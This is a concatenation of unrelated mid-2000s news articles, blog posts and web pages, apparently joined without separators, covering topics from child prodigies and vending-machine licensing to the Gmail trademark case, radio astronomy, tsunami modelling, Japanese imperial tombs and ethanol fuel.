But even that can be harmful , according to most studies , sort of like telling a little girl how pretty she is .
Experts say it 's important for children to learn that it 's not looks or brains that really matter .
It 's what you do with your talent that 's important .
So , whether your child is a future Einstein , or just like the rest of us , here are some things parents can do to spark their children 's inner genius .
Teach children that setbacks and mistakes are our friends .
Work through them and learn from them .
Tell children that their brains are like muscles .
The more you use it , the stronger it grows .
Praise them for their effort and improvement , not just their final results .
So for example , when Lilly learns a new country , we should n't applaud her , even though that 's what Lilly clearly enjoys .
Instead , say the experts , we should tell her , " Great job — you found it because you worked hard . "
Finally , it 's not enough just to memorize .
Context and meaning is what marks real intelligence , say Dweck and others .
For example , if you 're learning the presidents , try also learning about each president .
That 's what Abby 's done .
" There are some things that are really funny , " she said .
" Like Thomas Jefferson — he was trying to impress a girl so he jumped over a fence , but he tripped and damaged his right hand permanently , trying to impress a girl ! "
Abby and Adrian and Lilly are , in many ways , just normal kids .
Their parents say that is by design .
But prodigies or not , we love to see them in action .
He was not , he told the reporters and photographers who assembled in this northern New Jersey town , really all that concerned that candy posed a terrorist threat .
“ Our main concern was health .
Period , ” Mr. Poolas said , explaining why he and some colleagues started a project six months ago to inspect all of the town ’s candy and gum vending machines to make sure they were properly licensed .
Sure , he had mentioned terrorism , Mr. Poolas said , but only as a “ worst - case scenario . ”
Mr. Poolas and the town ’s mayor , James P. Dodd , who joined him in an impromptu press conference , explained that the idea for the project came after Mr. Poolas noticed unlicensed pinball machines in a store .
Then they found 96 candy machines that had licenses and 103 that did not .
For the safety of residents , Mr. Poolas said , “ we felt there should be accountability . ”
In the Star - Ledger article , Mr. Poolas was quoted as saying , “ Someone who wanted to do harm surely could ” by tampering with the vending machines .
Mr. Dodd was also quoted in the article .
“ It would be very easy for someone to put poison in one of these coin- operated devices that distribute candy to children , ” he said .
All in all , it was a jarring day for this town of 18,000 , which sits on the Rockaway River .
It is a former industrial town , where old brick buildings stand out against the flat architecture of the 1970s , and most of the residents are Hispanic .
There are Mexican restaurants everywhere .
And candy machines .

Surgically alters thumbs to better use iPhone
Thomas Martel , 28 , of Bonnie Brae is a big guy .
So he has a hard time using the features on ever - shrinking user interfaces on devices like his new iPhone .
At least , he did , until he had his thumbs surgically altered in a revolutionary new surgical technique known as “ whittling . ” ” From my old Treo , to my Blackberry , to this new iPhone ,
I had a hard time hitting the right buttons , and I always lost those little styluses , ” explains Martel .
“ Sure , the procedure was expensive , but when I think of all the time I save by being able to use modern handhelds so much faster , I really think the surgery will pay for itself in ten to fifteen years .
And what it ’s saving me in frustration – that ’s priceless . ”
Energy and Peak oil :
Peak Oil Policy
Peak Oil investing
“ This is really , on the edge sort of stuff , ” explains Dr. Robert Fox Spars , who worked on developing the procedure .
“ We ’re turning plastic surgery from something that people use in service of vanity , to a real tool for improving workplace efficiency .
” The procedure involved making a small incision into both thumbs and shaving down the bones , followed by careful muscular alteration and modification of the fingernails .
While Martel ’s new thumbs now appear small and effeminate in comparison to his otherwise very large hands , he says he can still lift “ pretty much anything I could lift before the surgery – though opening spaghetti sauce jars has been a problem .
That was a big surprise . ”

From FreeThoughtPedia
When theists find out you do n't believe in their particular flavor of the supernatural , they often respond with criticism and cynicism of your non-beliefs .
Here are some witty responses to many common theist claims against freethinkers :
The Bible says that atheism is wrong .
" The Bible also says some guy 's donkey talked . "
" The Bible also says that some guy lived inside of a whale "
If you believe in God and are wrong , then it 's no big deal , but if you do n't believe in God and are wrong , you 'll be punished eternally , so it 's not a good idea to be an atheist .
" But which God should one believe in ?
No matter what choice one makes some other religions will condemn them .
Why would God make us decide something like this and leave so little to tell us which to choose . "
" What if you 're wrong that God prefers unthinking self - righteous toadies to honest people who try and live a good life ? "
Deep down you really believe in God .
" Deep down , you realize that when you get ill , it 's better to visit a hospital than to pray . "
You 're only saying you 're an atheist to rebel against authority .
" And if the Beatles grew long hair to rebel against authority , then they really had no hair -- is that what you 're saying ? "
You probably are an atheist because you had a bad experience as a child .
" You probably worship God because you hate your real father . "
There are no atheists in foxholes .
" Probably because we have fewer excuses to start wars . "
" Really ?
Why then are there atheist meetings in the military ? " [ 1 ]
The Population Reference Bureau , an independent , private data analysis agency , shows military atheists comprise more than 20 % of the population .
In addition , atheism is more common in the military than in the civilian population . [ 2 ]
If you do n't believe in God , you 'll go to Hell !
" If you do n't stop believing in God right now , I 'll punch you in the face . "
" If heaven only contains the pious , the righteous and the religious I would prefer to stay with the kings , the rock and roll stars and the loose women . "
" I do n't believe in Hell either , now where do I go ? "
Why are you mad at God ?
" Because he 's supposed to be all good but he does n't even have the common decency to exist . "
Atheists are Satanic .
" Just like theists are agnostic ? "
" You 're more of a Satanist than me ; you actually believe in Satan . "
Without God there is no morality .
" Are we talking about the God that ordered Moses to kill babies and asked people to set animals on fire because he liked the smell ? "
" According to the bible , God killed over 2.2 million people , Satan killed 10 .
By the way the 2.2 million does n't even count the victims of Noah 's flood , Sodom and Gomorrah , or the many plagues , famines , fiery serpents , etc. , with which the good book is filled . "
" Are you saying that unless you 're threatened with eternal suffering , you wo n't have a reason not to rape your neighbor ? "
" Without religion good people would act good and evil people evil , but for a good man to act evil you need religion "
God is perfect , and He could n't be perfect if He did n't exist , which proves that He exists .
" No , it just proves he is n't perfect . "
People who follow Jesus are good , so you should follow Jesus .
" Chemotherapy can cure cancer , so everyone should have chemotherapy . "
" Really ?
How much did the church have to pay because the priests were touching little boys ?
Or do you consider pedophiles and molesters good people ? "
Jesus was either a liar , a crazy person , or the son of God .
He spoke against liars , and his behavior was n't crazy , so the only remaining possibility is that he was the son of God .
" So you 're telling me that if a polite , honest - looking , well - spoken , nicely dressed man walked up to you on the street and introduced himself as the earthly incarnation of God , you 'd figure he probably is ?
Have you considered the possibility that you 're the one who is crazy ? "
There were eye witnesses that Jesus worked miracles .
" There are eye witnesses that Bigfoot exists , Uri Geller works miracles , and aliens abduct people . "
Most people who know about Jesus believe in Him .
" If most people jumped off a bridge ... "
" Only 33 % of the world population is Christian .
Statistically speaking , it would n't be unreasonable to assume at least 50 % of the population ' knows about Jesus ' and do n't believe in him . " [ 3 ]
I know from personal experience that God exists .
" No he does n't .
He told me so himself . "
" I know from personal experience that God does not exist "
God wants you to believe in him without rational proof .
" Then he 's certainly doing a fine job of not tempting me with evidence . "
" So do Santa and the Easter Bunny "
You say you do n't believe that God exists , but the word " God " is meaningless if there is no such thing , so you are admitting that God exists even as you deny his existence .
" So you 're admitting unicorns exist , merely because you know what the word means ? "
" That reminds me , I do n't believe you owe me $ 100 . "
Hitler was an atheist .
" I do n't know about Hitler 's religion , but I do know that he was heterosexual , so can I assume you 're against that , too ? "
" Actually , Hitler was Roman Catholic .
In fact there are Nazi items that say ' God is with us ' in German . " [ 4 ]
" I believe today that my conduct is in accordance with the will of the Almighty Creator .
- Adolf Hitler , Mein Kampf , Vol. 1 Chapter 2 " [ 5 ]
Einstein believed in God .
Do you think you 're smarter than Einstein ?
" I was n't aware intelligent people are infallible , is n't that gods thing ?
Are you saying Einstein was / is god ?
*( actually Einstein was not a theist - religious people routinely take Einstein 's quotes out of context )
" ... and Leonardo da Vinci was gay .
Do you think you 're smarter than Leonardo ? "
" No . Einstein did not believe in God .
Theists continue to take his quotes way out of context . " [ 6 ]
The founding fathers intended the United States to be a Christian nation .
Atheists are n't welcome .
" Are you sticking with the whole ' slavery ' thing , too ? "
" Have you read the 1796 Treaty of Tripoli ?
The one the Senate unanimously approved and John Adams signed and read to the nation ?
Art. 11 the Government of the United States of America is not , in any sense , founded on the Christian religion . " [ 7 ]
" Which ' founding fathers ' are you talking about ?
The atheist or the deist ones ? " [ 8 ]
The universe is so complex that someone must have designed it .
" I do n't know -- that sentence was fairly complex but there was obviously not much thought behind it . "
" Says the person who 's never been off Earth "
" Where 's the rainbow factory ? "
" God seems pretty complex too so who created him ? "
" Complexity does not imply design .
Complexity implies complexity . "
Atheists believe in evolution , but if we teach our children evolution in public school they will believe that they are no better than animals and will grow up immoral .
" I 've met public school children .
Most of them are n't any better than animals . "
Evolution violates the second law of thermodynamics .
" No , but God does . "
" The second law of thermodynamics applies to closed systems .
The earth is not a closed system .
Without the solar system , the earth would perish . "
Well , evolution 's only a theory .
" So 's gravity . "
How can you not believe in Jesus Christ when the evidence is overwhelming ?
" Well , Jesus 's divinity is only a theory . "
" There is much more physical evidence that Santa exists .
I have met Santa .
Do you believe in Santa ? "
" There 's more contemporaneous evidence of Sherlock Holmes ' than there is of Jesus Christ .
Ask just as many people and they 'll think he really existed too . "
There 's proof that God exists , like the Bible and miracles .
" If your twenty - year - old son still believes in Santa Claus because he read a book about Santa visiting and presents magically appeared on Christmas morning when he was a child , would you praise him for having faith in the face of overwhelming evidence or call him an idiot ? "
" Neither of those are evidence "
My parents raised me to believe in God .
Are you calling my parents liars ?
" Can we talk about the Tooth Fairy for a minute ? "
" A liar is someone who knowingly speaks a false statement .
I am sure your parents believed what they told you was true .
I am saying your parents were very misinformed and passed that to you . "
There are so many wonderful things in the world , how can you say there is no God ?
" It 's really pretty easy : ' There is no god . '
See ? "
" You just did . "
" There also many horrible things in the world , many done in the name of god . "
There is so much beauty in the world that only God could have created it .
" My wife 's beautiful , and my mother - in - law made her . "
If there is no Heaven , then where do you go when you die ?
" The same place you were before you were conceived , I assume . "
You can't prove God does n't exist .
" So ?
You can't prove there is n't an invisible purple elephant in the trunk of my car . "
" You ca n't prove ANYTHING does not exist . "
" If I told you I could fly , would you take it ' on faith ' or would you demand proof ? "
You do n't know everything .
" And you do ? "
" And your point is ...? "
You can't see air , but you believe in it .
" I can't see bullshit , but I can smell it .
Right now , in fact . "
" I can prove air exists and it fits well with all the other things we know to be true .
God fails that test . "
" In LA you can . "
" Actually , it has different refractive properties from water , from pure vacuum , etc .
You can see air bubbles , can't you ? "
You can't see love , but you believe in it .
" And I agree that god , like love , is just a concept . "
God made
His image appear in this tortilla !
( Eat tortilla )
" No a heating element made that image appear on a tortilla .
You can buy a toaster that makes images of the virgin Mary online . "
" If your god attempts to reaffirm your belief by appearing on food stuff , he does n't sound like the type of dude I would like to hang out with anyway . "
You call yourself an atheist but you have faith .
Everyone has faith in something .
" I have faith that this conversation is n't going anywhere .
Bye ! "
" Who 's debating that faith does n't exist ?
Maybe that is why you are so confused . "
" Faith is belief in something in the absence of evidence .
The next time you 're really ill , put your ' faith ' to the test by praying to be cured instead of going to a hospital .
Then you can tell me you have ' faith . ' "

The Challenge of Federalism Iraq Set to Disintegrate , New Study Warns
It 's no secret that Iraq is a politically , ethnically and religiously fractured country .
But a new study released in Berlin on Wednesday argues that federalism remains the country 's last , best hope .
Otherwise , it may fall apart completely .
Google has been banned from discussing the Gmail trademark in German courts after trying to win back the rights to the Gmail moniker .
In Germany the name " G- mail " is currently owned by thirty - three year old Daniel Giersch , who trademarked it in 2000 , four year before Google started its worldwide Gmail e-mail service .
Gmail has been known as Google Mail in Germany since 2005 but still uses the " @gmail.com " ending to all Google Mail e-mail addresses since it is , in effect , an international " standard " for the service .
" As far as the Hanseatic Higher Court is concerned , the legal situation is unambiguous to the extent that it has not allowed an appeal to the Federal Court of Justice , " said Giersch 's lawyer Sebastian Eble , from the office of Preu Bohling & Partners .
There are still cases pending in Spain , Portugal , and Switzerland , however , but Giersch and his lawyers hope that the final decision in Germany will discourage Google from trying to use courts in other countries to effect a change that now appears impossible , without a settlement .
Yet Giersch says he does n't want a settlement with Google ; he wants them to go away .
In a statement , Daniel Giersch said , " I have made it clear since the beginning that I will never sell the name .
I am absolutely convinced of its success .
Neither ' Gmail ' nor myself are for sale . "
Giersch currently uses the Gmail name for his own e-mail service , and while there 's no word on how successful Giersch 's company actually is , the fact remains that he still owns the Gmail trademark which is used in his e-mail addresses ending in " @gmail.de . "
After viewing his web site , though , it looks like Giersch 's Gmail service is actually still in beta testing .
The decision has a lot of people wondering what will happen to current Google Mail users in Germany .
The Gmail name has been used since 2004 in a total of 60 countries .
I contacted Google to get some more information on what could be expected by current users .
Senior legal counsel for Google , Arnd Haller , had this to say of the lawsuit : " While we regret the German court 's decision , it will in no way affect our ability to continue to provide web e-mail to our users in Germany .
Our German users will continue to use ' Google Mail ' and enjoy the same experience as users of Gmail worldwide . "
So it looks like there are n't any drawbacks to Gmail in Germany , other than its official title , and users will still be able to hang on to their " @gmail.com " e-mail addresses .
As a result of the ruling , however , Google will no longer be able to fight over the Gmail trademark in German courts .
In June , it was rumored that Google was planning to shut down its Google Mail service entirely after arguments with the Bundestag , the national parliament of the Federal Republic of Germany , over Google Mail 's ability to provide anonymous e-mail accounts which were rumored to be in violation of Bundestag 's Internet surveillance laws .
After discussing this with Google , I was told that the rumor stemmed from " a theoretical discussion between [ Google 's ]
Global Privacy Counsel and an editor talking about a proposed law in Germany that would ban anonymous webmail addresses . "
In fact , though , such a law " would make it unreasonably onerous for anyone to provide webmail in Germany . "
Google has no plans to shut down Google Mail or Gmail .
I ask you before you read on - who are you and in what principles do you believe ?
Do you know ?
For sure ?
Did you choose them or where they given to you ?
Do you believe in Democratic ideals ?
Or perhaps Republican ?
Maybe Libertarian or Green ?
If not , what title describes you ?
I ask you next : why ?
Why do you label yourself , and what do you think was the root - reason of that label ?
Perhaps you had an issue where you needed help and subscribe to a more socialist policy ?
Perhaps you were a small business ower who made good who wants government off your back and pushes more to a Repbulican belief system .
Who knows ?
But are you now a victim of that label ?
Or proud of it ?
Either way , does any label completely stand for who you are ?
I hope not .
I used to feel this way , and now I am changing my political party for the second time in my life .
I ask you above all other things , are you not a person who respects your fellow man ?
If you answer yes , please consider my words below .
I forward for your consideration that Ron Paul is the one person who truely respects you .
I also propose he is the man who respects your neighbor .
I forward for your consideration , that Ron Paul is the one man who is running on a platform that can unite people vs. divide .
I want to live in a united country , and hope you do as well .
If you believe , that first and foremost , government is the solution to .
I must openly question your logic .
Let me ask you a few questions .
1 . Why do you trust government , on faith ?
2 . Do you measure government performance vs. your own ?
3 . Would you consider that there are more than two axis to consider for solutions to problems " Big Business " vs Government
If you consider my points , you will find may place that government does succeed .
National Defense , sound money , maintaining liberty , free press , etc .
These domains require a strong central government and support freedom .
Why ?
Because they do not serve a ' sub - group ' .
Money is money and whether it be in your hand or mine , it is still a dollar .
National defense does the same , we are one nation right ?
And due - process serves us all , equally .
Dr. Paul would support a job for a National government in roles such as these .
If you continue to examine national government performance , there are many areas where it fails miserably .
These areas are often where a large national government attempts to take from one group to serve another .
My point is that even government fails .
And if government fails , another organization should be able to meet the need of the citizens it serves .

First Instant World Telescope Views Distant Galaxy
SYDNEY , Australia , September 5 , 2007 ( ENS ) -
For the first time , radio telescopes in Australia , China and Europe have been linked in real - time , in effect creating a telescope almost as big as the Earth .
Last week , a telescope near Coonabarabran , New South Wales operated by the Australian government research agency CSIRO was used simultaneously with one near Shanghai , China , and five in Europe .
The linked telescopes all observed a remote galaxy called 3C273 .

" This is the first time we 've been able to instantaneously connect telescopes half a world apart , " said Dr. Tasso Tzioumis , with CSIRO 's Australia Telescope National Facility .
" It 's a fantastic technical achievement , and a tribute to the ability of the network providers to work together , " he said .
Data from the telescopes was streamed around the world at a rate of 256 Mb per second - about 10 times faster than the fastest broadband speeds available to Australian households - to a research center in Europe , where it was processed with a special - purpose digital processor .
To demonstrate the instant world telescope , the data results were transmitted to Xi'an , China , where they were watched live by experts in advanced networking at the 24th Asia - Pacific Advanced Network , APAN meeting .
From Australia to Europe , the CSIRO data travelled on a dedicated high capacity one gigabyte , 1 Gb , per second link set up by the Australian Academic Research Network , AARNet , the Canadian research and education network CANARIE , and the Dutch SURFnet .

The more widely separated the telescopes , the more finely detailed the observations can be .
" The diameter of the Earth is 12,750 kilometers and the two most widely separated telescopes in our experiment were 12,304 km apart , in a straight line , " Dr. Tzioumis said .

The telescope linking technique , called very long baseline interferometry , used to take weeks or months .
" We used to record data on tapes or disks at each telescope , along with time signals from atomic clocks .
The tapes or disks would then be shipped to a central processing facility to be combined , " Dr. Tzioumis said .
The technique allows observations of an object that are made simultaneously by many telescopes to be combined , simulatng a telescope with a size equal to the maximum separation between the telescopes .
The institutions that took part in the experiment are all collaborators in the EXPReS project , known formally as the Express Production Real - time e-VLBI Service .

" This is a fantastic achievement , " said Huib van Langevelde , director of JIVE , who was present at the APAN meeting in China .
" When we started doing e-VLBI we wondered whether we would ever be able to connect to these far - away telescopes , because there are not only various oceans to cross but also many different network providers . "
The major activity of JIVE has been the development , construction and successful operation of a powerful supercomputer that combines the signals from radio telescopes located across the planet , creating a single virtual telescope of intercontinental dimensions .
Arpad Szomoru , head of R&D at JIVE , said , " We have recently developed and implemented various solutions that allow us to stream data over these enormous distances that overcome the problems with long round trip times . "
Additional tests with telescopes in Puerto Rico and Chile are planned for the near future .
EXPReS aims to implement up to 16 simultaneous 1
Gb per second network connections between the central processor at JIVE and partner telescopes across Europe , Asia , Australia , South Africa , South America and the United States by 2009 .
Today ’s earthquakes near Sumatra fortunately did n’t lead to a major tsunami .
But figuring out when tsunamis will develop is a difficult matter — and an interesting exercise in applied mathematics .
The main phenomenon is the propagation of so - called shallow water waves — water waves whose wavelength is large compared to the depth of the ocean .
Those waves satisfy a partial differential equation ( PDE ) that was figured out in the 1800s .
The equation is a nasty nonlinear one — that ca n’t be solved exactly .
I ’ve been working on the numerical differential equation capabilities of Mathematica for more than a decade .
Our goal is to automate the solutions of all types of equations — so users just have to enter their equation , and Mathematica then does all the analysis to select and apply the best algorithm .
The shallow - water equations are a good test — that I ’m happy to say Mathematica passes with flying colors .
One essentially just has to type the equations in , and get the solution , which is then easy to visualize — especially using the new visualization capabilities of Mathematica 6 .
( Click the image below to see the Mathematica animation . )
Let me explain a little about what ’s involved in getting this .
Here ’s an image of a Mathematica notebook that produces the main picture ( you can download the notebook here ) :
The first thing is just the equations , given in Mathematica Standard Form ( one could use Traditional Form so it looks exactly like a traditional textbook , but it ’s slightly harder to understand that way ) .
Then we just use NDSolve to solve the equations .
Then we use Plot3D to create a 3D visualization — complete with specular surfaces and everything .
And finally , we use Animate to create an animation .
( We can immediately export for the web using Export . )
What ’s going on inside NDSolve ?
That one function is doing some pretty complicated things — it ’s almost a microcosm of a century or two of applied mathematics .
NDSolve is doing a lot of things that can really only be done in Mathematica — by combining Mathematica ’s strength not only in numerical computation , but also in symbolic computation and discrete mathematics .
That you can just type an equation into NDSolve relies on Mathematica ’s general symbolic architecture .
Once NDSolve gets an equation , it immediately determines the structure .
In this case , it finds out that it ’s been given a ( 2+1 ) - dimensional initial - value PDE .
For that type of equation , it forms a discrete grid in space ( with the grid structure determined automatically to meet a certain accuracy criterion ) , then generates a large system of first - order ODEs on that grid , automatically incorporating all the necessary boundary conditions .
NDSolve has about 20 different families of methods for solving ODEs .
In this case , it actually switches automatically between explicit and implicit methods depending on local stiffness .
( The implicit methods get to use some of our very fast sparse matrix–solving capabilities . )
In the end , NDSolve packages its solution as an InterpolatingFunction — a very convenient Mathematica construct that directly represents an approximate function , that in this case we chose to plot using Plot3D .
( Even though NDSolve can figure out what to do automatically , you can always give it hints , or even tell it exactly what method to use .
In this case , you can improve the quality of the solution by choosing to use a pseudospectral method with a specified number of grid points . )
As one of the people responsible for NDSolve , I know how complicated all the things it does inside are .
But when you use NDSolve , all you have to do is type your equation in , and let Mathematica do the rest .
We ’ve done the work ( and it ’s been a lot of work , I might add ) to have everything run efficiently and automatically from there .
It might take a while to work out the physics of the shallow water wave approximation to a tsunami .
But I think I can say that Mathematica ’s part of solving the equations could be accomplished before a tsunami has propagated very far .
Most astronomers say that world - famous images from the Wilkinson Microwave Anisotropy Probe ( WMAP ) satellite show structures of the early universe .
But a lone radio astronomer is claiming that the pictures depict nearby hydrogen gas clouds in our own galaxy , calling a key theory into question .
Astronomers are abuzz because if Gerrit Verschuur of the University of Memphis is right , one of the most important theories developed in the past 15 years – one that won a Nobel Prize – would be toppled .
The world ’s top astronomical publication , Astrophysical Journal , will publish Verschuur 's research December 10 .
" If I 'm right , this is a paradigm shift , " said Verschuur , who is 70 and a well - known author of numerous books on astronomy .
It would mean our understanding of how the cosmos was born 14 billion years ago is seriously flawed .
Astronomers would have redder faces than they ’ve had since the beginning of the 20th century , when some scientists claimed they saw " canals " built by Martians on the red planet .
NASA scientists led by George Smoot of the Lawrence Berkeley National Laboratory announced in 1992 that their Cosmic Background Explorer satellite had imaged the ultimate baby pictures of the universe , revealing the seeds .
Like acorns growing into oak trees , they theorized , those seeds grew into galaxies like the star - packed Milky Way , our own spiral - shaped celestial home .
Stephen Hawking called it the greatest discovery of all time .
Smoot compared it to seeing the face of God .
In 2003 , higher - resolution images of the seeds were taken by another satellite , the Wilkinson Microwave Anisotropy Probe , known as WMAP , showing numerous fine seeds or " ripples " that resemble a serious case of acne .
Verschuur 's research asserts that the seeds are not located on the edge of the universe at all .
Rather , he says , the so - called seeds are very nearby :
They 're just previously unmapped clouds of " neutral hydrogen " gas located inside the Milky Way .
In other words , astronomers who mistook the " seeds " for objects on the edge of the universe are like someone who looks outdoors through a window and mistakes smudges on the glass for clouds in the sky .
" Smoot said he saw the face of God .
All I can say is , God lives in our neighborhood , " Verschuur joked .
He said he ’s found at least 200 instances where the so - called cosmic seeds lie suspiciously close to known hydrogen clouds inside our galaxy .
There 's a long history of astronomical debates over whether celestial objects are close or distant .
For example , the former Mt. Palomar and Mt. Wilson astronomer Halton
Arp has argued that super - bright objects in the heavens , quasars , are located much closer to Earth than is generally believed , and that they ’re ejected from galaxies like pinballs from pinball machines .
But virtually all astronomers reject
Arp ’s claims on the grounds that they ’re based on an unconvincing statistical analysis of the comparative locations of quasars and galaxies .
This week , a similar critique is being lobbed against Verschuur .
But , surprisingly , the most cautious reaction came from Smoot .
" One would have to do a very careful ( statistical ) study to see if this ( correlation between hydrogen filaments and cosmic seeds ) could happen by simple chance or is truly convincing , " Smoot said in an e-mail .
Within the astronomical community , he noted , experts are quick to fault Verschuur ’s correlations between hydrogen and cosmic seeds as statistically unsound .
" That might be the correct conclusion , " Smoot said , " but seems a little fast to me . "
At Oxford University in England , astrophysicists Kate Land and Anze Slosar have conducted a statistical analysis of Verschuur ’s work .
" It does not hold water at all , " Land told Wired News by e-mail .
In other words , she believes Verschuur ’s correlations between the WMAP seeds and galactic hydrogen filaments are just coincidences .
If that 's true , then Verschuur ’s claim is an astronomical version of those Bible evangelists who think they see Jesus ’ face in a burrito .
" Notoriously , by eye , one can often think they see correlations between patterns , " Land said .
“ But one does n't really see the anti-correlations .
So two maps ( of the sky ) that just fluctuate randomly can appear correlated . "
A leading cosmologist with the WMAP project , David Spergel of Princeton , agreed .
Verschuur ’s " is basically a wrong article , " he said .
NASA scientist Gary F. Hinshaw concurred : " I am quite confident that the … correlations claimed in the Verschuur paper are not ( statistically ) significant . "
Ultimatelly , Verschuur ’s claim will stand or fall upon the treacherous terrain of statistics , which means it likely wo n't be settled anytime soon .
History shows that debates over statistical interpretations can go on forever .
The defenders of orthodox cosmology claim Verschuur ’s analysis of celestial images is statistically too fragile to take seriously .
He counters that his data is too convincing to be deflated by fancy - pants statistical manipulations .
Astronomers regale their students with cautionary tales of stargazers who embarrassed themselves when they reported seeing celestial sights that were n't really there .
Besides the Martian " canals , " some of the funnier examples include the astronomer who , in the 1920s , claimed he saw swarms of insects on the Moon .
In the 19th century , astronomers reported – incorrectly – that they saw a planet inside Mercury ’s orbit , which they dubbed " Vulcan . "
Now all that remains of Vulcan is its most famous fictional inhabitant , Mr. Spock of Star Trek .
Like the rest of us , astronomers sometimes see what they expect to see .
For astronomers , the problem now is to decide who's " seeing " things – Verschuur ?
Or themselves ?
Verschuur said he felt " terror " when he published his article , because he 's just one guy at a campus living in a small Tennessee town outside of Memphis , and he 's taking on the whole astronomical world .
But he consoles himself with his wife ’s advice : " Gerrit , remember that you ’re just communicating what the data show . "
Via Think Progress , we learn that General Petraeus met privately with the Republican caucus and told them he will deliver ‘ real progress ’ by August .
According to Andrea Mitchell , who was bandying about this scoop , the Republicans are deeply skeptical and are readying to jump ship on the President .
Here are some excerpts , taken from The Chris Matthews Show .
MITCHELL : I think the Republicans are going to crack .
What I ’ve been told from inside the moderate center of the Republican caucus is that the vote in favor of the president this week — it was against the president but the Republicans holding for the president — was misleading .
That they really are not in favor of the surge .
They do n’t believe it ’s going to work .
But they basically said the president has until August , until Labor Day .
After that , if it does n’t work , they ’re running .
MITCHELL : They ’ll stick until September and then they ’ll leave .
I believe very firmly that they ’re against what he is doing but they feel that General Petraeus has persuaded them that for all intents and purposes , they ca n’t vote a withdrawal before September .
MITCHELL : Petraeus went to the Republican caucus and told them , I will have real progress to you by August .
They told him , if — we ’ll stick with you — KLEIN : I do n’t think he did .
Well , I — excuse me …
MATTHEWS : Agree to disagree .
KLEIN : I believe that he did not , and I think that this is a… MATTHEWS :
But the country was led to believe — by the way , the nature of the surge , the word itself is an escalation , suggests a short - term upgrade of the effort .
KLEIN : Counter - insurgency tactics are not a surge .
They ’re a glacier that takes years to work .
MATTHEWS : Then we were given the wrong labeling here .
We have the word surge .
Andrea , we got the label from the president himself .
KLEIN : The important thing this is n’t going to work .
MITCHELL : The Republicans were against the surge but they felt it was fait accompli , and that they were willing to give Petraeus until August .
He told them there will be real progress by August .
They have told him at a caucus meeting as very , very recently , that if there is n’t progress by August — and real progress means not a day of violence and a day of sanity — that they will pull the plug .
I wish Joe Klein had been allowed to spit out whatever it was he was trying to say , because he seemed to be contradicting Mitchell ’s account .
Regardless , her account is disturbing for several reasons .
First , I think it is inappropriate for the commanding general in Iraq to meet privately with the Republican caucus to plot a legislative strategy for dealing with the Democrats .
And that is what it appears Mitchell was reporting .
Second , if they know ( or strongly believe ) that the plan is not going to work ( especially by August ) then they have no business sending tens of thousands of troops into harms way .
It ’s immoral and it ’s very expensive , and it will make matters worse .
Third , if the Republicans want to give the President until August to shore up the Maliki government , they should have crafted amendments to the effect , and lobbied moderate Democrats to support their amendments .
There could have been some real bipartisan cooperation for such a strategy .
My last observation is that it appears support for Bush is crumbling and crumbling quite a bit faster than anticipated .
We really should be quietly planning for a caretaker government to take us through the fall into the 2008 election season .
The Republicans should n’t wait until their drubbing in November ’08 to start cleaning up their house .
Their party can’t survive much more of this and it is only getting started with Waxman , Conyers , and Leahy launching a major multipronged oversight attack just before congress adjourned for their spring break .
The second half of April will be filled with hearings on incredibly damaging revelations about the Bush administration ’s malfeasance .
The leaders of the GOP must begin preparing themselves for the worst .
Better to get it over with this year and spend next year recuperating .
No one can defend this administration at this point .
And they have no incentive to further sully themselves in the attempt .
It ’s too bad that Obama is badly off message .
The divine origins of Japan 's imperial family come under scrutiny as it allows limited access to two burial sites .
Japan 's imperial household agency is to open the doors to some of the country 's mysterious imperial tombs early next year after decades of pressure from archaeologists , in a move expected to anger ultra-conservatives .
Experts have long been denied access to the hundreds of imperial mausoleums and tombs , which the agency regards as not so much cultural relics as sacred religious sites .
Some historians , however , put the agency 's reticence down to fears that close inspection of the burial mounds could unearth evidence that shatters commonly accepted theories about the origins of the Japanese imperial family .
Members of archaeological and historical societies will be granted limited access to two tombs in February and March , the Kyodo news agency said , quoting imperial household sources .
Excavation work will be prohibited and researchers will be permitted to enter only the tombs ' fringes .
The mausoleums are those of the Meiji emperor ( 1852 -1912 ) and Empress Jingu ( 170 -269 ) , wife of the Emperor Chuai , whose date of birth is unknown .
While the move by the agency - the opaque bureaucracy that runs the affairs of the imperial family - is unlikely to shed new light on the origins of what some believe is the world 's oldest monarchy , for Japan 's increasingly vocal ultra-right , even this modest concession is a step too far .
They subscribe to the ancient myth that holds that Japan 's emperors are the direct descendants of the sun goddess Amaterasu Omikami , and that the current monarch is the latest in an unbroken line of 125 emperors stretching back more than 2,600 years to Jimmu in the seventh century BC .
Although the wartime emperor , Hirohito , renounced his divine status after Japan 's defeat in 1945 , ultra-nationalists regard his son , the current emperor , Akihito , as a living god , and have issued death threats to archaeologists involved in previous attempts to gain access to the tombs .
Their greatest fear is that proper inspections of the tombs will reveal compelling evidence that the Japanese imperial family originated from China and the Korean peninsula .
Akihito alluded to his Korean ancestry on his 68th birthday in 2001 .
In remarks that were ignored or played down by most of the domestic media , he said : " I for my part , feel a certain kinship with Korea , given the fact that it is recorded in the Chronicles of Japan that the mother of Emperor Kammu was of the line of King Muryong of Paekche . "
Kammu reigned from 781 to 806 AD while Muryong ruled the Paekche kingdom in Korea from 501 to 523 AD .
Earlier this month , the agency reprimanded a member of staff for removing a contentious entry about the imperial family 's background on Wikipedia 's Japanese - language site .
The offending paragraph read : " There is a view that the imperial household agency may be afraid that historical facts may be discovered that could shake the foundations of the imperial system . "
The employee received a " severe " verbal warning not for his editing , but for making the change on an agency computer , which can be traced by the operators of the online encyclopaedia .
The secrecy surrounding the sites means that no one can be certain what lies inside them .
They may be the final resting places of the emperors themselves , accompanied by artefacts and treasures , or they may , as some believe , turn out to be nothing more than hollow mounds of earth .
There are an estimated 20,000 ancient burial mounds dotted around Japan , but the most important are the 896 imperial tombs , including those of 124 emperors , from Jimmu to Hirohito , who died in 1989 .
Every year , envoys conduct Shinto rituals at the tombs and offer gifts from the emperor , a practice critics say violates the constitutional separation of religion and state .
Many of the most important burial sites are in and around the western cities of Nara and Kyoto , both ancient capitals .
The biggest , belonging to Emperor Nintoku ( early fifth century ) , is a keyhole - shaped mound near Osaka that covers almost 500,000 square metres .

SOMETIMES you do things simply because you know how to .
People have known how to make ethanol since the dawn of civilisation , if not before .
Take some sugary liquid .
Add yeast .
Wait .
They have also known for a thousand years how to get that ethanol out of the formerly sugary liquid and into a more or less pure form .
You heat it up , catch the vapour that emanates , and cool that vapour down until it liquefies .
The result burns .
And when Henry Ford was experimenting with car engines a century ago , he tried ethanol out as a fuel .
But he rejected it — and for good reason .
The amount of heat you get from burning a litre of ethanol is a third less than that from a litre of petrol .
What is more , it absorbs water from the atmosphere .
